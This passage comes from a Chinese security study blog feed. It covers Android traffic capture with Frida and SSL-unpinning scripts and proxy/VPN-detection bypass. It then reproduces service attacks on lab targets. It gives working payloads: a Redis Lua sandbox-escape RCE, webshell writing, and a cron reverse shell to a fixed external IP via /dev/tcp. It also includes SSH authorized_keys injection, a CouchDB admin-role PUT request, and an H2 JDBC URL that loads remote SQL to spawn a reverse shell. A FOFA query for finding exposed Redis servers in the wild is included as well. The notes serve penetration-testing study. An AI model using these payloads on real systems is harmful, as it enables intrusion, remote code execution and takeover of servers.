class="hljs-number">14</span>(这里看自己安装的版本)<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241002164211-xnoh5cr.png" alt="image">​</p></li><li><p>模拟器安装 Frida</p><p> 下载：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br> 真机：ARM版本及位数 模拟器：无ARM的位数</p><p> <img src="/assets/image-20241002164242-pwb3xe2.png" alt="image">​</p><p> 模拟器查看系统位数</p><p> <img src="/assets/image-20241002164351-npno7k2.png" alt="image">​</p><p> <code>getprop ro.product.cpu.abi</code>​</p><p> <img src="/assets/image-20241002164436-r5vi5pi.png" alt="image">​</p><p> <img src="/assets/image-20241002164458-h99kjh1.png" alt="image">​</p><p> 从本地把<code>frida-server</code>​上传到模拟器目录下并重新命名</p><p> <code>nox_adb.exe push frida-server /data/local/xxx</code>​</p><p> <img src="/assets/image-20241002164852-w3t13x7.png" alt="image">​</p><p> <img src="/assets/image-20241002164911-jj8w2wn.png" alt="image">​</p></li><li><p>本地连接</p><p> <img src="/assets/image-20241002165106-pgrjdym.png" alt="image">​</p><p> <img src="/assets/image-20241002165127-ubl270s.png" alt="image">​</p><p> 转发</p><p> <code>adb forward tcp:27042 tcp:27042</code>​</p><p> 本地连接判断</p><p> <code>frida-ps -U</code>​(不用转发也能成功)</p><p> <code>frida-ps -R</code>​(需要转发才能成功)</p><p> <img src="/assets/image-20241002165458-tkxpa20.png" alt="image">​</p></li></ol><p>‍</p><h6 id="Firda-r0capture-WireShark"><a href="#Firda-r0capture-WireShark" class="headerlink" title="Firda+r0capture+WireShark"></a>Firda+r0capture+WireShark</h6><ul><li><p>GitHub 地址：<a href="https://github.com/r0ysue/r0capture">https://github.com/r0ysue/r0capture</a></p></li><li><p>模拟器执行：.&#x2F;frida-x86</p></li><li><p>获取包名：ls &#x2F;data&#x2F;data 或 Apk 资源器查看</p></li><li><p>使用 r0capture 抓包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python r0capture.py -U -f 包名 -p xxxx.pcap<br></code></pre></td></tr></table></figure></li><li><p>然后就会在目录下生成 pcap 数据包</p></li></ul><p>优点：基本可以通杀，而且不需要安装什么环境，配置好直接用就完了</p><p>缺点：数据包是 wireshark 产生的，后面数据包只能用 wireshark 查看，不如在 BP 中方便</p><p>‍</p><p>‍</p><p>‍</p><h6 id="Firda-HOOK-JS-BurpSuite"><a href="#Firda-HOOK-JS-BurpSuite" class="headerlink" title="Firda+HOOK-JS+BurpSuite"></a>Firda+HOOK-JS+BurpSuite</h6><ul><li><p>GitHub 地址：<a href="https://github.com/apkunpacker/FridaScripts">https://github.com/apkunpacker/FridaScripts</a></p></li><li><p>模拟器执行：.&#x2F;frida-x86</p></li><li><p>此方案也可以解决单向验证证书</p></li><li><p>本地执行：</p><ol><li><p>在模拟器中开启 app 代理，代理服务器为 BP 监听的地址端口</p></li><li><p>在项目中找到要使用的 js 文件复制到 adb.exe 同级目录下，然后在该目录下打开终端后执行以下命令<br> 这里用到的是 SSLUnpinning.js</p> <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">frida -U -f 包名 -l .\hookjs文件<br></code></pre></td></tr></table></figure></li><li><p>此时就会自动打开该软件，bp 能够抓到数据包。</p></li></ol></li></ul><p>‍</p><p>‍</p><p>‍</p><h6 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h6><p>利用场景：能反编译，有证书文件</p><ol><li><p>直接使用解压工具解压 apk 文件，然后在其中查找 apk 的证书文件</p><ul><li><p>证书一般在 assets 和 res 目录中，后缀通常为 cer、bks、p12、crt</p></li><li><p>提取证书文件路径可以使用 mobsf，也可以使用 appinfo</p><ul><li>appinfo 的 GitHub 地址：<a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></li></ul></li></ul></li><li><p>反编译后得到证书文件的密钥</p><ul><li><p>apk 有加固或者加壳，反编译需要先脱壳</p></li><li><p>脱壳：</p><ul><li><p>先在使用<code>.\nox_adb.exe shell</code>​ 进入模拟器执行<code>./frida-x86</code>​ 后，执行以下命令：<br>这里用到的是 <code>DumpDex.js</code>​</p><p><code>frida -U -f 包名 -l .\hookjs文件</code>​</p></li><li><p>然后需要执行一些命令才能脱壳</p></li></ul></li></ul></li><li><p>Burp 导入证书后实现对应抓包</p><ul><li><p>将提取到的证书安装到 BP 流程：<br>打开 BP-&gt;settings-&gt; 搜索 tls-&gt;Client TLS certificates-&gt;add-&gt; 选择从 apk 提取到的证书安装 -&gt; 若需要密码，还需从 apk 反编译源码中找到密钥</p><p><img src="/assets/image-20241002170627-7isxmj2.png" alt="image">​</p></li></ul></li></ol><p>‍</p><h5 id="3、逆向删反代码重打包-1"><a href="#3、逆向删反代码重打包-1" class="headerlink" title="3、逆向删反代码重打包"></a>3、逆向删反代码重打包</h5><p>‍</p><h3 id="反代理VPN"><a href="#反代理VPN" class="headerlink" title="反代理VPN"></a>反代理VPN</h3><p>代理检测、VPN检测、发包框架强制不走代理<br>配置代理后无法访问，数据异常等<br>连接VPN节点后无法访问，数据异常等<br>配置代理后正常访问且无任何异常，但无数据包</p><p><img src="/assets/image-20240929182510-5sg829a.png" alt="image">​</p><p><img src="/assets/image-20240929182755-87tdwbm.png" alt="image">​</p><p>‍</p><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法:"></a>绕过方法:</h4><h5 id="1、用APP工具设置-Postern"><a href="#1、用APP工具设置-Postern" class="headerlink" title="1、用APP工具设置-Postern"></a>1、用APP工具设置-Postern</h5><p><img src="/assets/image-20240929183024-1rb4775.png" alt="image">​</p><p><img src="/assets/image-20240929183042-e4woyfp.png" alt="image">​</p><p><img src="/assets/image-20240929183054-6fk6tgp.png" alt="image">​</p><p><img src="/assets/image-20240929183111-fd3o5ts.png" alt="image">​</p><p><img src="/assets/image-20240929183124-cuz7lzr.png" alt="image">​</p><p><img src="/assets/image-20240929183140-vj4bxt7.png" alt="image">​</p><h5 id="2、用PC工具设置-Proxifier"><a href="#2、用PC工具设置-Proxifier" class="headerlink" title="2、用PC工具设置-Proxifier"></a>2、用PC工具设置-Proxifier</h5><p><img src="/assets/image-20240929183310-x7udd3f.png" alt="image">​</p><p><img src="/assets/image-20240929183343-f2hbuff.png" alt="image">​</p><h5 id="3、逆向删反代码重打包-2"><a href="#3、逆向删反代码重打包-2" class="headerlink" title="3、逆向删反代码重打包"></a>3、逆向删反代码重打包</h5>]]></content>
    
    
    <categories>
      
      <category>APP攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APP攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>服务攻防</title>
    <link href="/2024/09/05/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    <url>/2024/09/05/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="服务攻防"><a href="#服务攻防" class="headerlink" title="服务攻防"></a>服务攻防</h1><p><img src="/assets/image-20240927205746-8oaupv2.png" alt="image">​</p><p>‍</p><p>‍</p><h1 id="前置环境搭建"><a href="#前置环境搭建" class="headerlink" title="前置环境搭建"></a>前置环境搭建</h1><ol><li><p>Vulfocus (官方在线的无法使用)</p></li><li><p>官方手册：<a href="https://fofapro.github.io/vulfocus/#/">https://fofapro.github.io/vulfocus/#/</a></p></li><li><p>搭建参考：</p><ul><li><p>vulfocus 靶机环境搭建部署：</p><ul><li><a href="https://blog.csdn.net/csd_ct/article/details/121158165">https://blog.csdn.net/csd_ct&#x2F;article&#x2F;details&#x2F;121158165</a></li></ul></li><li><p>vulfocus 不能同步的解决方法 &#x2F;vulfocus 同步失败：</p><ul><li><a href="https://blog.csdn.net/m0_64563956/article/details/131229046">https://blog.csdn.net/m0_64563956&#x2F;article&#x2F;details&#x2F;131229046</a></li></ul></li></ul></li><li><p>自己搭建：</p><ol><li><p>拉取镜像 (我用的是虚拟机 kali）</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">docker pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure></li><li><p>运行vulfocus</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> -v /<span class="hljs-keyword">var</span>/run/docker.sock:/<span class="hljs-keyword">var</span>/run/<br>docker.sock -e VUL_IP=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> vulfocus/vulfocus<br></code></pre></td></tr></table></figure><ul><li>-d 后台运行</li><li>-v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock 为 docker 交互连接。</li><li>-e DOCKER_URL 为 Docker 连接方式，默认通过 unix:&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock 进行连接，也可以通过 tcp:&#x2F;&#x2F;xxx.xxx.xxx.xxx:2375 进行连接（必须开放 2375 端口）。</li><li>-e VUL_IP=xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。</li><li>默认账户密码为 admin&#x2F;admin</li></ul></li><li><p>直接访问 web 页面</p><p> <img src="/assets/image-20240927232604-l3f8iyl.png" alt="image">​</p></li><li><p>镜像拉取太慢记得配置代理</p></li></ol></li></ol><p>‍</p><p>‍</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>‍</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><ul><li><p>默认端口：6379</p></li><li><p>Redis 是一套开源的使用 ANSI C 编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的 API。Redis 如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p></li></ul><p>‍</p><h3 id="沙箱绕过-RCE-CVE-2022-0543"><a href="#沙箱绕过-RCE-CVE-2022-0543" class="headerlink" title="沙箱绕过 RCE-CVE-2022-0543"></a>沙箱绕过 RCE-CVE-2022-0543</h3><ol><li><p>启动靶场后有个映射端口 (注意这是数据库，不是网站，网站访问会报错，无法访问)，使用工具（Another Redis Desktop Manager）直接连接，发现可以连接成功</p><p> <img src="/assets/image-20240927233243-frs1sm9.png" alt="image">​</p></li><li><p>在命令行执行 poc，这里是执行 id 命令</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> <span class="hljs-string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240927233420-32kuul5.png" alt="image">​</p></li><li><p>命令执行成功，实战中也有，可以使用 fofa 直接搜 redis 服务并且 6379 端口，若数据包有返回内容，说明可以进行尝试，若数据包为错误返回，则没有</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fofa搜索语法 port=<span class="hljs-string">&quot;6379&quot;</span> &amp;&amp; protocol=<span class="hljs-string">&quot;redis&quot;</span><br></code></pre></td></tr></table></figure><p> 若返回如下则无未授权访问</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">-ERR unknown command `help`, with args beginning with:<br>-NOAUTH Authentication required.<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><h3 id="未授权访问-CNVD-2019-21763"><a href="#未授权访问-CNVD-2019-21763" class="headerlink" title="未授权访问 - CNVD-2019-21763"></a>未授权访问 - CNVD-2019-21763</h3><ul><li><p>由于在 Reids 4.x 及以上版本中新增了模块功能，攻击者可通过外部拓展，在 Redis 中实现一个新的 Redis 命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。</p></li><li><p>利用工具项目：<a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p></li><li><p>利用：</p><ul><li><p>启动靶场，获得映射端口，然后利用工具执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">cd RedisModulesSDK/<br>make<br></code></pre></td></tr></table></figure><p>Then, exp.so is in <code>RedisModulesSDK/exp.so</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python redis-master.py -r 目标IP -p 目标端口 -L 攻击IP -P <span class="hljs-number">8888</span> -f RedisModulesSDK/exp.so -c <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240927234146-w4ucvn5.png" alt="image">​</p><p>这里用的 kali 虚拟机搭建的靶场，然后也用的 kali 进行的攻击，所以目标 ip 和攻击 ip 是一样的</p></li></ul></li></ul><p>‍</p><p>‍</p><p>‍</p><h3 id="未授权访问：CNVD-2015-07557"><a href="#未授权访问：CNVD-2015-07557" class="headerlink" title="未授权访问：CNVD-2015-07557"></a>未授权访问：CNVD-2015-07557</h3><p>三种利用方式，都是利用写文件</p><h4 id="写-Webshell"><a href="#写-Webshell" class="headerlink" title="写 Webshell"></a>写 Webshell</h4><ul><li><p>利用条件：有 Web 网站，且 Web 目录权限可读写，需得到 Web 路径</p></li><li><p>利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">config set dir /tmp <span class="hljs-comment">#设置WEB写入目录</span><br>config set dbfilename <span class="hljs-number">1</span>.php <span class="hljs-comment">#设置写入文件名</span><br>set test <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> <span class="hljs-comment">#设置写入文件代码</span><br>bgsave <span class="hljs-comment">#保存执行</span><br>save <span class="hljs-comment">#保存执行</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="写定时任务反弹-shell"><a href="#写定时任务反弹-shell" class="headerlink" title="写定时任务反弹 shell"></a>写定时任务反弹 shell</h4><ul><li><p>利用条件：Redis 服务使用 ROOT 账号启动，安全模式 protected-mode 处于关闭状态</p></li><li><p>利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">config set dir /<span class="hljs-keyword">var</span>/spool/cron<br>set yy <span class="hljs-string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.94.236.117/5555 0&gt;&amp;1\n\n\n&quot;</span><br>config set dbfilename x<br>save<br></code></pre></td></tr></table></figure></li><li><p>注意：</p><ul><li>centos 会忽略乱码去执行格式正确的任务计划，而 ubuntu 并不会忽略这些乱码，所以导致命令执行失败</li></ul></li></ul><h4 id="写入-Linux-ssh-key-公钥"><a href="#写入-Linux-ssh-key-公钥" class="headerlink" title="写入 Linux ssh-key 公钥"></a>写入 Linux ssh-key 公钥</h4><ul><li><p>利用条件：Redis 服务使用 ROOT 账号启动，安全模式 protected-mode 处于关闭状态，允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p></li><li><p>利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh-keygen -t rsa<br>cd /root/.ssh/<br>(<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; key.txt<br>cat key.txt | redis-cli -h 目标IP -x set xxx<br><span class="hljs-comment">//以上步骤在自己的攻击机器上执行</span><br>config set dir /root/.ssh/<br>config set dbfilename authorized_keys<br>save<br>cd /root/.ssh/<br>ssh -i id_rsa root@目标IP<br></code></pre></td></tr></table></figure></li></ul><h3 id="自动化项目"><a href="#自动化项目" class="headerlink" title="自动化项目"></a>自动化项目</h3><ul><li><p>项目 GitHub 地址：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p></li><li><p>小迪说实战中直接利用攻击测就 ok，一个一个测试太慢了</p></li><li><p>利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost IP<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240928113154-d1rrb8a.png" alt="image">​</p></li></ul><p>‍</p><p>‍</p><h2 id="Couch"><a href="#Couch" class="headerlink" title="Couch"></a>Couch</h2><ul><li>默认端口：5984</li><li>Apache CouchDB 是一个开源数据库，专注于易用性和成为 “完全拥抱 web 的数据库”。它是一个使用 JSON 作为存储格式，JavaScript 作为查询语言，MapReduce 和 HTTP 作为 API 的 NoSQL 数据库。应用广泛，如 BBC 用在其动态内容展示平台，Credit Suisse 用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web 和应用程序）。在 2017 年 11 月 15 日，CVE-2017-12635 和 CVE-2017-12636 披露利用。</li></ul><p>‍</p><h3 id="命令执行-CVE-2017-12636"><a href="#命令执行-CVE-2017-12636" class="headerlink" title="命令执行 - CVE-2017-12636"></a>命令执行 - CVE-2017-12636</h3><ul><li>漏洞利用项目地址：<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></li></ul><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol><li><p>下载上面的 exp.py</p></li><li><p>修改 exp.py 中的目标和反弹地址</p><p> <img src="/assets/image-20240928113711-oy894qs.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><h3 id="垂直权限绕过（CVE-2017-12635）"><a href="#垂直权限绕过（CVE-2017-12635）" class="headerlink" title="垂直权限绕过（CVE-2017-12635）"></a>垂直权限绕过（CVE-2017-12635）</h3><ol><li><p>先创建用户，使用 bp 或者 postman 发 PUT 包创建即可，这里我用的是 postman</p><p> 数据包内容</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:xiaodi</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.94.236.117:44389<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br> <br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog"><span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;SuYou&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog"><span class="hljs-string">&quot;roles&quot;</span>: [],</span><br><span class="language-prolog"><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;suyou&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240928113952-n054rh4.png" alt="image">​</p></li><li><p>登录用户授权，访问 <a href="http://xxx.xxx.xxx.xxx:xxx/\_utils/#login">http://xxx.xxx.xxx.xxx:xxx/\_utils/#login</a> 登录页面<br> 用户名密码 SuYou suyou<br> 成功登录到数据库</p><p> <img src="/assets/image-20240928114018-9hafnlc.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h2 id="H2database"><a href="#H2database" class="headerlink" title="H2database"></a>H2database</h2><ul><li><p>默认端口：20051</p></li><li><p>Java SQL 数据库 H2,H2 的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在 v2.1.210 + 中修复。2.1.210 之前的 H2 控制台允许远程攻击者通过包含子字符串的 jdbc:h2:mem JDBC URL 执行任意代码。</p></li><li><p>H2database 标志界面</p><p><img src="/assets/image-20240928114115-psueiwt.png" alt="image">​</p></li></ul><h3 id="未授权访问-CVE-漏洞"><a href="#未授权访问-CVE-漏洞" class="headerlink" title="未授权访问 &amp; CVE 漏洞"></a>未授权访问 &amp; CVE 漏洞</h3><h4 id="未授权进入"><a href="#未授权进入" class="headerlink" title="未授权进入"></a>未授权进入</h4><p>直接在 JDBC URL 处填入以下内容即可无需用户密码进入数据库</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">jdbc:</span>h2:mem:test1;FORBID_CREATION=<span class="hljs-literal">FALSE</span>;IGNORE_UNKNOWN_SETTINGS=<span class="hljs-literal">TRUE</span>;FORBID_CREATION=<span class="hljs-literal">FALSE</span>;\<br></code></pre></td></tr></table></figure><p>这里还可以使用 rmi 进行攻击尝试</p><p>‍</p><h4 id="RCE-执行反弹"><a href="#RCE-执行反弹" class="headerlink" title="RCE 执行反弹"></a>RCE 执行反弹</h4><ol><li><p>在自己服务器上创建数据库文件：h2database.sql，内容如下</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> test (<br>id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS BEFORE <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> TEST <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,base64加密的反弹shell指令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);&#x27;</span>;<br></code></pre></td></tr></table></figure><p> 反弹指令示例</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">bash <span class="hljs-operator">-</span>i <span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span> <span class="hljs-operator">/</span>dev<span class="hljs-operator">/</span>tcp<span class="hljs-operator">/</span>x.x.x.x<span class="hljs-operator">/</span><span class="hljs-number">6666</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>在服务器上启动提供 SQL 文件远程加载服务，python，或者 apache 之类的都可以</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python3 <span class="hljs-operator">-</span>m http.server 端口<br></code></pre></td></tr></table></figure></li><li><p>在服务器上启动监听端口，这里上面反弹的是 6666. 所以监听 6666</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">nc <span class="hljs-operator">-</span>lvvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure></li><li><p>在靶场访问的界面 JDBC URL 处填入 Payload 使其加载远程 SQL</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">jdbc:h2:mem:test1;FORBID_CREATION<span class="hljs-operator">=</span><span class="hljs-literal">FALSE</span>;IGNORE_UNKNOWN_SETTINGS<span class="hljs-operator">=</span><span class="hljs-literal">TRUE</span>;FORBID_CREATION<span class="hljs-operator">=</span><span class="hljs-literal">FALSE</span>;INIT<span class="hljs-operator">=</span>RUNSCRIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;http://搭建的IP:端口/h2database.sql&#x27;</span>;\<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>以下均为常见CVE复现，依靠前期的信息搜集再用POC去打</p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="端口协议"><a href="#端口协议" class="headerlink" title="端口协议"></a>端口协议</h1><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>服务攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>服务攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>业务逻辑</title>
    <link href="/2024/08/05/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
    <url>/2024/08/05/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/</url>
    
    <content type="html"><![CDATA[<h1 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h1><p>‍</p><h1 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h1><p><img src="/assets/image-20240908144659-eklrkb2.png" alt="image">​</p><h2 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h2><p>‍</p><h3 id="水平越权-同级"><a href="#水平越权-同级" class="headerlink" title="水平越权-同级"></a>水平越权-同级</h3><p><img src="/assets/image-20240908151737-a7lczt9.png" alt="image">​</p><p><img src="/assets/image-20240908152103-gnnxidk.png" alt="image">​</p><p><img src="/assets/image-20240908152323-d00nrms.png" alt="image">​</p><p><img src="/assets/image-20240908152426-u9lbfxw.png" alt="image">​</p><p><img src="/assets/image-20240908152530-sn7x7vo.png" alt="image">​</p><p><img src="/assets/image-20240908152805-sjasuwk.png" alt="image">​</p><h3 id="垂直越权-低到高"><a href="#垂直越权-低到高" class="headerlink" title="垂直越权-低到高"></a>垂直越权-低到高</h3><p><img src="/assets/image-20240908152846-83rcfeh.png" alt="image">​</p><p><img src="/assets/image-20240908152938-bcmut8c.png" alt="image">​</p><p>用刚才抓到包进行修改</p><p><img src="/assets/image-20240908153123-7jawe5x.png" alt="image">​</p><p><img src="/assets/image-20240908153140-s9l9drw.png" alt="image">​</p><h3 id="未授权访问-无用户"><a href="#未授权访问-无用户" class="headerlink" title="未授权访问-无用户"></a>未授权访问-无用户</h3><p><img src="/assets/image-20240908153202-u7sq03v.png" alt="image">​</p><p><img src="/assets/image-20240908153216-s1h68iw.png" alt="image">​</p><p><img src="/assets/image-20240908153233-nxfk9jz.png" alt="image">​</p><p>‍</p><h2 id="检测项目"><a href="#检测项目" class="headerlink" title="检测项目"></a>检测项目</h2><p>真实情况下如果要测试的点很少，推荐手工进行测试。<br>因为这些插件都需要配置，需要不少时间，有这个时间可能手工都测完了。</p><h3 id="burp插件"><a href="#burp插件" class="headerlink" title="burp插件"></a>burp插件</h3><p>检测BP插件</p><p><a href="https://github.com/smxiazi/xia_Yue">xia_Yue</a></p><p><img src="/assets/image-20240908153255-vfbg4sx.png" alt="image">​</p><p><img src="/assets/image-20240908153315-eem6xlw.png" alt="image">​</p><p><a href="https://github.com/simioni87/auth_analyzer">auth_analyzer</a></p><p>或者官方插件商店获取</p><p>该插件使用参考文章：<br><a href="https://www.cnblogs.com/ychun/p/17836941.html">https://www.cnblogs.com/ychun/p/17836941.html</a></p><p><img src="/assets/image-20240908153349-pi0kfii.png" alt="image">​</p><p><img src="/assets/image-20240908153408-wski5n8.png" alt="image">​</p><h3 id="对比项目"><a href="#对比项目" class="headerlink" title="对比项目"></a>对比项目</h3><ul><li><p>GitHub 地址：<a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p><ul><li>好像是有点 bug，不过小迪修好了，直接用小迪发的就行，没有的直接看 GitHub 